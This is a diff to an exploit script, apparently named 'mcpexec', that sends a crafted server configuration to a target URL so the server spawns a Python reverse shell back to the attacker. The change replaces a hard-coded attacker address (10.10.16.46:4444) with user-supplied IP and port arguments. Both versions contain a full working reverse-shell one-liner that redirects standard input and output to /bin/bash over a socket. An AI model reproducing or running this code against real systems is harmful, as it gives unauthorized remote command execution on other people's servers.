@@ -29,8 +29,10 @@ def command():
         )
 
     parser.add_argument('url')
+    parser.add_argument('ip', help="Your IP address the server will connect to")
+    parser.add_argument('port', help="Your open port the server will connect to")
     args = parser.parse_args()
-    if not args.url:
+    if not args.url or not args.ip or not args.port:
         parser.error(f"mcpexec: try 'mcpexec -h' or 'mcpexec --help' for more information.")
     return args
 
@@ -44,7 +46,7 @@ def exploit(args):
             "serverConfig": {
                 "type": "stdio",
                 "command": f"python3",
-                "args": ["-c", "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.16.46\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],
+                "args": ["-c", f"import socket,subprocess,os;s=socket.socket();s.connect((\"{args.ip}\",{args.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"],
                 "env":{}
             },
             "serverId": "test"
